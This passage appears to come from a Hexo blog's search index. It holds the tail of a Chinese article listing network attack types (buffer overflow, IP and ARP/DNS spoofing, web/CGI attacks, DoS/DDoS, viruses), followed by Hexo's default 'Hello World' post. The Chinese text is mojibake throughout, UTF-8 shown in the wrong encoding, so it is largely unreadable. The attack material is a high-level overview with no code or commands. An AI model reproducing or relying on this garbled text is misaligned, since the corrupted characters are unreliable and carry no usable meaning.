æƒé™çš„å†…å­˜ä¸­ï¼Œé‚£ä¹ˆä¸€æ—¦è¿™äº›<br>æŒ‡ä»¤å¾—åˆ°äº†è¿è¡Œï¼Œé»‘å®¢å°±ä»¥root æƒé™æ§åˆ¶äº†ç³»ç»Ÿï¼Œè¾¾åˆ°å…¥ä¾µçš„ç›®çš„ã€‚ç¼“å†²åŒºæ”»å‡»çš„ç›®çš„åœ¨äºæ‰°ä¹±<br>æŸäº›ä»¥ç‰¹æƒèº«ä»½è¿è¡Œçš„ç¨‹åºçš„åŠŸèƒ½ã€‚ä½¿æ”»å‡»è€…è·å¾—ç¨‹åºçš„æ§åˆ¶æƒã€‚<br>ï¼ˆ6)ä¼ªè£…æ”»å‡»ï¼Œé€šè¿‡æŒ‡å®šè·¯ç”±æˆ–ä¼ªé€ å®¶åœ°å€ï¼Œä»¥å‡å†’èº«ä»½äºå…¶ä»–ä¸»æœºè¿›è¡Œåˆæ³•é€šè®¯ã€æˆ–å‘é€å‡<br>æ•°æ®åŒ…ï¼Œä½¿å—æ”»å‡»ä¸»æœºå‡ºç°é”™è¯¯åŠ¨ä½œã€‚å¦‚IPæ¬ºéª—ã€‚<br>(7)ç”µå­æ¬ºéª—æ”»å‡»ã€‚é»‘å®¢åˆ©ç”¨TCP/TPåè®®æœ¬èº«çš„ä¸€äº›ç¼ºé™·å¯¹TCP/IPç½‘ç»œè¿›è¡Œæ”»å‡»ï¼Œä¸»è¦æ–¹å¼<br>æœ‰ï¼šARPæ¬ºéª—ã€DNSæ¬ºéª—ã€Web æ¬ºéª—ã€ç”µå­é‚®ä»¶æ¬ºéª—ç­‰ï¼Œ</p><p>(8)WWWæ”»å‡»ã€‚åˆ©ç”¨WEBçš„ä¸åˆç†é…ç½®ï¼Œæˆ–CGIç¨‹åºçš„æ¼æ´è¿›è¡Œæ”»å‡»ï¼Œè¾¾åˆ°è·å–è„šæœ¬æºç ï¼Œéæ³•<br>æ‰§è¡Œç¨‹åºï¼Œä½¿WWWæœåŠ¡å™¨å´©æºƒç­‰ç›®çš„ã€‚å¦‚ï¼šWindouws NTçš„IISæœåŠ¡å™¨çš„å¤šç§æ”»å‡»ã€‚<br>(9)æ‹’ç»æœåŠ¡å’Œåˆ†å¸ƒå¼æ‹’ç»æœåŠ¡æ”»å‡»ã€‚è¿™ç§æ”»å‡»è¡Œä¸ºé€šè¿‡å‘é€ä¸€å®šæ•°é‡ä¸€å®šåºåˆ—çš„æ•°æ®åŒ…ï¼Œæ˜¯<br>ç½‘ç»œæœåŠ¡å™¨ä¸­å……æ–¥äº†å¤§é‡è¦æ±‚å›å¤çš„ä¿¡æ¯ï¼Œæ¶ˆè€—ç½‘ç»œå¸¦å®½æˆ–ç³»ç»Ÿèµ„æºï¼Œå¯¼è‡´ç½‘ç»œæˆ–ç³»ç»Ÿä¸èƒœè´Ÿè·ä»¥<br>è‡³ç˜«ç—ªã€åœæ­¢æ­£å¸¸çš„ç½‘ç»œæœåŠ¡ã€‚<br>ï¼ˆ10)ç—…æ¯’æ”»å‡»ã€‚ç—…æ¯’æ˜¯é»‘å®¢å®æ–½ç½‘ç»œæ”»å‡»çš„æœ‰æ•ˆæ‰‹æ®µä¹‹ä¸€ï¼Œå®ƒå…·æœ‰éšè”½æ€§ã€å¯„ç”Ÿæ€§ã€ç¹æ®–æ€§å’Œ<br>ç ´åæ€§ï¼Œè€Œä¸”åœ¨ç½‘ç»œä¸­æ›´åŠ å¯æ€•ã€‚ç›®å‰å¯é€šè¿‡ç½‘ç»œè¿›è¡Œä¼ æ’­çš„ç—…æ¯’å·²æœ‰æ•°åƒä¸­ã€‚<br>ä¸ºäº†å¯¹è¿™äº›å½±å“ç½‘ç»œå®‰å…¨çš„å¨èƒè¿›è¡Œæœ‰æ•ˆé˜²èŒƒï¼Œæˆ‘ä»¬å¿…é¡»é‡‡ç”¨æœ‰æ•ˆçš„æŠ€æœ¯æ‰‹æ®µã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2020/10/04/hello-world/"/>
    <url>/2020/10/04/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a class="header-anchor" href="#Quick-Start">ğŸ­</a>Quick Start</h2><h3 id="Create-a-new-post"><a class="header-anchor" href="#Create-a-new-post">ğŸ­</a>Create a new post</h3><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a class="header-anchor" href="#Run-server">ğŸ­</a>Run server</h3><pre><code class="hljs bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a class="header-anchor" href="#Generate-static-files">ğŸ­</a>Generate static files</h3><pre><code class="hljs bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a class="header-anchor" href="#Deploy-to-remote-sites">ğŸ­</a>Deploy to remote sites</h3><pre><code class="hljs bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
